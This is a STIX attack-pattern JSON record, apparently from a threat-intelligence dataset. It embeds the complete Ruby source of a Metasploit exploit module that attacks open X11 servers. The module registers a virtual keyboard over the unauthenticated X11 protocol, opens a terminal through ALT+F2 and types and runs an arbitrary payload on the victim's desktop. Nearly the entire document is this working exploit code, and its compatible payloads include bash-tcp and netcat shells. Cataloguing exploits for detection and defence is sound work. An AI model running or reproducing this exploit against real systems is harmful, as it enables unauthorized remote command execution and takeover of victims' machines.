{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f04380ae-6429-4d64-aab1-e743faac6579",
    "created": "2024-08-14T17:14:32.631796Z",
    "modified": "2024-08-14T17:14:32.631801Z",
    "name": "X11 Keyboard Command Injection",
    "description": " This module exploits open X11 servers by connecting and registering a virtual keyboard. The virtual keyboard is used to open an xterm or gnome terminal and type and execute the specified payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/x11/x11_keyboard_exec.rb",
            "external_id": "x11_keyboard_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::Tcp\n\n  KB_KEYS = {\n    '1' => \"\\x0a\",\n    '2' => \"\\x0b\",\n    '3' => \"\\x0c\",\n    '4' => \"\\x0d\",\n    '5' => \"\\x0e\",\n    '6' => \"\\x0f\",\n    '7' => \"\\x10\",\n    '&' => \"\\x10\",\n    '8' => \"\\x11\",\n    '9' => \"\\x12\",\n    '(' => \"\\x12\",\n    '0' => \"\\x13\",\n    ')' => \"\\x13\",\n    '-' => \"\\x14\",\n    '=' => \"\\x15\",\n    'q' => \"\\x18\",\n    'w' => \"\\x19\",\n    'e' => \"\\x1a\",\n    'r' => \"\\x1b\",\n    't' => \"\\x1c\",\n    'y' => \"\\x1d\",\n    'u' => \"\\x1e\",\n    'i' => \"\\x1f\",\n    'o' => \"\\x20\",\n    'p' => \"\\x21\",\n    '[' => \"\\x22\",\n    '{' => \"\\x22\",\n    ']' => \"\\x23\",\n    '}' => \"\\x23\",\n    'a' => \"\\x26\",\n    's' => \"\\x27\",\n    'd' => \"\\x28\",\n    'f' => \"\\x29\",\n    'g' => \"\\x2a\",\n    'h' => \"\\x2b\",\n    'j' => \"\\x2c\",\n    'k' => \"\\x2d\",\n    'l' => \"\\x2e\",\n    ';' => \"\\x2f\",\n    ':' => \"\\x2f\",\n    \"'\" => \"\\x30\",\n    '\"' => \"\\x30\",\n    '`' => \"\\x31\",\n    '~' => \"\\x31\",\n    'lshift' => \"\\x32\",\n    '\\\\' => \"\\x33\",\n    '|' => \"\\x33\",\n    'z' => \"\\x34\",\n    'x' => \"\\x35\",\n    'c' => \"\\x36\",\n    'v' => \"\\x37\",\n    'b' => \"\\x38\",\n    'n' => \"\\x39\",\n    'm' => \"\\x3a\",\n    ',' => \"\\x3b\",\n    '<' => \"\\x3b\",\n    '.' => \"\\x3c\",\n    '>' => \"\\x3c\",\n    '/' => \"\\x3d\",\n    '*' => \"\\x3f\",\n    'alt' => \"\\x40\",\n    ' ' => \"\\x41\",\n    'f2' => \"\\x44\"\n  }\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'X11 Keyboard Command Injection',\n      'Description'     => %q{\n        This module exploits open X11 servers by connecting and registering a\n        virtual keyboard. The virtual keyboard is used to open an xterm or gnome\n        terminal and type and execute the specified payload.\n      },\n      'Author'          =>\n        [\n          'xistence <xistence[at]0x90.nl>'\n        ],\n      'Privileged'      => false,\n      'License'         => MSF_LICENSE,\n      'Payload'         =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'gawk bash-tcp python netcat'\n            }\n        },\n      'Platform'        => ['unix'],\n      'Arch'            => ARCH_CMD,\n      'Targets'         =>\n        [\n          [ 'xterm (Generic)', {}],\n          [ 'gnome-terminal (Ubuntu)', {}],\n        ],      'DisclosureDate'  => '2015-07-10',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6000),\n        OptInt.new('TIME_WAIT', [ true, 'Time to wait for opening GUI windows in seconds', 5])\n      ])\n  end\n\n\n  def xkeyboard_key\n    req = \"\"\n    req << @xkeyboard_opcode\n    req << \"\\x05\" # Extension minor: 5 (LatchLockState)\n    req << \"\\x04\\x00\" # Request length: 4\n    req << \"\\x00\\x01\" # DeviceSpec: 0x0100 (256)\n    req << \"\\x00\" # affectModLocks: 0\n    req << \"\\x00\" # modLocks: 0\n    req << \"\\x01\" # lockGroup: True\n    req << \"\\x00\" # groupLock: 0\n    req << \"\\x00\" # affectModLatches: 0\n    req << \"\\x00\" # Unused\n    req << \"\\x00\" # latchGroup: False\n    req << \"\\x00\\x00\" # groupLatch: 0\n    req << \"\\x00\" # Undecoded\n    return req\n  end\n\n\n  def press_key(key)\n\n    req = xkeyboard_key\n\n    req << @xtest_opcode\n    req << \"\\x02\" # Extension minor: 2 (FakeInput)\n    req << \"\\x09\\x00\" # Request length: 9\n    req << \"\\x02\" # Press key (Type: 2)\n    req << key # What key to press\n    req << \"\\x04\\x00\" # Unused?\n    req << \"\\x00\\x00\\x00\\x00\" # Time\n    req << \"\\x00\\x00\\x00\\x00\" # Root\n    req << \"\\x07\\x00\\x07\\x00\" # Unused?\n    req << \"\\x88\\x04\\x02\\x00\" # Unused?\n    #req << \"\\x00\\x01\" # rootX: 256\n    #req << \"\\xf5\\x05\" # rootY: 1525\n    req << \"\\x00\\x00\" # rootX: 0\n    req << \"\\x00\\x00\" # rootY: 0\n    req << \"\\x00\\x00\\x00\\x00\" # Unused?\n    req << \"\\x00\\x00\\x00\" # Unused?\n    req << \"\\x00\" # deviceid: 0\n\n    req << xkeyboard_key\n\n    req << \"\\x2b\" # Opcode 43: GetInputFocus\n    req << \"\\x00\" # Unused\n    req << \"\\x01\\x00\" # Request length: 1\n\n    sock.put(req)\n\n    res = sock.get_once\n\n    # Response should give 1 on first byte (Success)\n    unless res && res[0,1] == \"\\x01\"\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Error pressing key: #{key} #{res.inspect}\")\n    end\n\n  end\n\n  def release_key(key)\n\n    req = xkeyboard_key\n\n    req << @xtest_opcode\n    req << \"\\x02\" # Extension minor: 2 (FakeInput)\n    req << \"\\x09\\x00\" # Request length: 9\n    req << \"\\x03\" # Release key (Type: 3)\n    req << key # What key to release\n    req << \"\\x04\\x00\" # Unused?\n    req << \"\\x00\\x00\\x00\\x00\" # Time\n    req << \"\\x00\\x00\\x00\\x00\" # Root\n    req << \"\\x07\\x00\\x07\\x00\" # Unused?\n    req << \"\\x88\\x04\\x02\\x00\" # Unused?\n    #req << \"\\x00\\x01\" # rootX: 256\n    #req << \"\\xf5\\x05\" # rootY: 1525\n    req << \"\\x00\\x00\" # rootX: 0\n    req << \"\\x00\\x00\" # rootY: 0\n    req << \"\\x00\\x00\\x00\\x00\" # Unused?\n    req << \"\\x00\\x00\\x00\" # Unused?\n    req << \"\\x00\" # deviceid: 0\n\n    req << xkeyboard_key\n\n    req << \"\\x2b\" # Opcode 43: GetInputFocus\n    req << \"\\x00\" # Unused\n    req << \"\\x01\\x00\" # Request length: 1\n\n    sock.put(req)\n\n    res = sock.get_once\n\n    # Response should give 1 on first byte (Success)\n    unless res && res[0,1] == \"\\x01\"\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Error releasing key: #{key} #{res.inspect}\")\n    end\n\n  end\n\n  def type_command(command)\n    # Specify the special keys which need to have shift pressed first to type\n    specialkeys = '<>{}|\"&()'.chars\n    values = command.chars\n    values.each do |value|\n      key = KB_KEYS[value]\n      # Special keys need a shift pressed to be typed\n      if Regexp.union(specialkeys) =~ value\n        press_key(KB_KEYS[\"lshift\"]) # [lshift]\n        press_key(key)\n        release_key(KB_KEYS[\"lshift\"])\n        release_key(key)\n      # Uppercase characters need to be converted to lowercase and be typed in combination with the shift key to generate uppercase\n      elsif value =~ /[A-Z]/\n        press_key(KB_KEYS[\"lshift\"]) # [lshift]\n        press_key(KB_KEYS[value.downcase])\n        release_key(KB_KEYS[\"lshift\"])\n        release_key(KB_KEYS[value.downcase])\n      # All normal keys which are not special keys or uppercase characters\n      else\n        press_key(key)\n        release_key(key)\n      end\n    end\n    # Send an enter\n    press_key(\"\\x24\") # [enter]\n    release_key(\"\\x24\") # [enter]\n  end\n\n  def send_msg(sock, data)\n    sock.put(data)\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while not read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue EOFError\n    end\n    data\n  end\n\n  def exploit\n\n    begin\n      connect\n\n      print_status(\"#{rhost}:#{rport} - Register keyboard\")\n\n      req = \"\\x6c\" # Byte order (Little-Endian)\n      req << \"\\x00\" # Unused\n      req << \"\\x0b\\x00\" # Protocol major version: 11\n      req << \"\\x00\\x00\" # Protocol minor version: 0\n      req << \"\\x00\\x00\" # Authorization protocol name length: 0\n      req << \"\\x00\\x00\" # Authorization protocol data length: 0\n      req << \"\\x00\\x00\" # Unused\n\n     # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 initial communication failed\")\n      end\n\n\n      # Keyboard registration\n      req = \"\\x62\" # Opcode 98: QueryExtension\n      req << \"\\x00\" # Unused\n      req << \"\\x05\\x00\" # Request length: 5\n      req << \"\\x09\\x00\" # Name length: 9\n      req << \"\\x60\\x03\" # Unused?\n      req << \"XKEYBOARD\" # Name\n      req << \"\\x00\\x00\\x00\" # Unused, padding?\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      if res && res[0,1] == \"\\x01\"\n        @xkeyboard_opcode = res[9,1] # Retrieve the XKEYBOARD opcode\n      else\n        #puts res.inspect\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request QueryExtension (opcode 98) XKEYBOARD failed\")\n      end\n\n\n      req = \"\"\n      req << @xkeyboard_opcode\n      req << \"\\x00\" # Extension minor: 0 (UseExtension)\n      req << \"\\x02\\x00\" # Request length: 2\n      req << \"\\x01\\x00\" # Wanted Major: 1\n      req << \"\\x00\\x00\" # Wanted Minor: 0\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request XKEYBOARD (opcode 136) failed -\")\n      end\n\n\n      req = \"\\x62\" # Opcode 98: QueryExtension\n      req << \"\\x00\" # Unused\n      req << \"\\x06\\x00\" # Request length: 6\n      req << \"\\x0f\\x00\" # Name length: 15\n      req << \"\\x00\\x00\" # Unused\n      req << \"XInputExtension\" # Name\n      req << \"\\x00\" # Unused, padding?\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request QueryExtension (opcode 98) XInputExtension failed\")\n      end\n\n\n      req = \"\\x62\" # Opcode 98: QueryExtension\n      req << \"\\x00\" # Unused\n      req << \"\\x04\\x00\" # Request length: 4\n      req << \"\\x05\\x00\" # Name length: 5\n      req << \"\\x00\\x00\" # Unused\n      req << \"XTEST\" # Name\n      req << \"\\x00\\x00\\x00\" # Unused, padding?\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      if res && res[0,1] == \"\\x01\"\n        @xtest_opcode = res[9,1] # Retrieve the XTEST opcode\n      else\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request QueryExtension (opcode 98) XTEST failed\")\n      end\n\n\n      req = \"\\x62\" # Opcode 98: QueryExtension\n      req << \"\\x00\" # Unused\n      req << \"\\x08\\x00\" # Request length\n      req << \"\\x17\\x00\" # Name length\n      req << \"\\x00\\x00\" # Unused\n      req << \"Generic Event Extension\" # Name\n      req << \"\\x00\" # Unused, padding?\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      if res && res[0,1] == \"\\x01\"\n        @genericevent_opcode = res[9,1] # Retrieve the Generic Event Extension opcode\n      else\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request QueryExtension (opcode 98) Generic Event Extension failed\")\n      end\n\n\n      req = \"\"\n      req << @genericevent_opcode\n      req << \"\\x00\" # Extension minor: 0 (QueryVersion)\n      req << \"\\x02\\x00\" # Request length: 2\n      req << \"\\x01\\x00\" # Client major version: 1\n      req << \"\\x00\\x00\" # Client minor version: 0\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request XKEYBOARD failed\")\n      end\n\n\n      req = \"\"\n      req << @xtest_opcode\n      req << \"\\x00\" # Extension minor: 0 (GetVersion)\n      req << \"\\x02\\x00\" # Request length: 2\n      req << \"\\x02\\x00\" # Major version: 2\n      req << \"\\x02\\x00\" # Minor version: 2\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request XTEST failed\")\n      end\n\n\n      req = \"\\x65\" # Opcode 101: GetKeyboardMapping\n      req << \"\\x00\" # Unused\n      req << \"\\x02\\x00\" # Request length: 2\n      req << \"\\x08\" # First keycode: 8\n      req << \"\\xf8\" # Count: 248\n      req << \"\\x02\\x00\" # Unused?\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request GetKeyboardMapping (opcode 101) failed\")\n      end\n\n\n      req = \"\"\n      req << @xkeyboard_opcode\n      req << \"\\x08\" # Extension minor: 8 (GetMap)\n      req << \"\\x07\\x00\" # Request length: 7\n      req << \"\\x00\\x01\" # Device spec: 0x0100 (256)\n      req << \"\\x07\\x00\" # Full: 7\n      req << \"\\x00\\x00\" # Partial: 0\n      req << \"\\x00\" # firsType: 0\n      req << \"\\x00\" # nTypes: 0\n      req << \"\\x00\" # firstKeySym: 0\n      req << \"\\x00\" # nKeySym: 0\n      req << \"\\x00\" # firstKeyAction: 0\n      req << \"\\x00\" # nKeysActions: 0\n      req << \"\\x00\" # firstKeyBehavior: 0\n      req << \"\\x00\" # nKeysBehavior: 0\n      req << \"\\x00\\x00\" # virtualMods: 0\n      req << \"\\x00\" # firstKeyExplicit: 0\n      req << \"\\x00\" # nKeyExplicit: 0\n      req << \"\\x00\" # firstModMapKey: 0\n      req << \"\\x00\" # nModMapKeys: 0\n      req << \"\\x00\" # firstVModMapKey: 0\n      req << \"\\x00\" # nVModMapKeys: 0\n      req << \"\\x00\\x00\" # Unused, padding?\n\n      # Retrieve the whole X11 details response\n      res = send_msg(sock,req)\n\n      # Response should give 0x01 in first byte (Success)\n      unless res && res[0,1] == \"\\x01\"\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - X11 Request XKEYBOARD failed\")\n      end\n\n\n      # Press ALT+F2 to start up \"Run application\"\n      print_status(\"#{rhost}:#{rport} - Opening \\\"Run Application\\\"\")\n      press_key(KB_KEYS[\"alt\"])\n      press_key(KB_KEYS[\"f2\"])\n      release_key(KB_KEYS[\"alt\"])\n      release_key(KB_KEYS[\"f2\"])\n\n      # Wait X seconds to open the dialog\n      print_status(\"#{rhost}:#{rport} - Waiting #{datastore['TIME_WAIT']} seconds...\")\n      Rex.sleep(datastore['TIME_WAIT'])\n\n      if datastore['TARGET'] == 0\n        # Start a xterm terminal\n        print_status(\"#{rhost}:#{rport} - Opening xterm\")\n        type_command(\"xterm\")\n      else\n        # Start a Gnome terminal\n        print_status(\"#{rhost}:#{rport} - Opening gnome-terminal\")\n        type_command(\"gnome-terminal\")\n      end\n\n      print_status(\"#{rhost}:#{rport} - Waiting #{datastore['TIME_WAIT']} seconds...\")\n      # Wait X seconds to open the terminal\n      Rex.sleep(datastore['TIME_WAIT'])\n\n      # \"Type\" our payload and execute it\n      print_status(\"#{rhost}:#{rport} - Typing and executing payload\")\n      command = \"nohup #{payload.encoded} &2>/dev/null; sleep 1; exit\"\n\n      type_command(command)\n\n      handler\n    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout => e\n      print_error(\"#{rhost}:#{rport} - #{e.message}\")\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['unix']"
    ]
}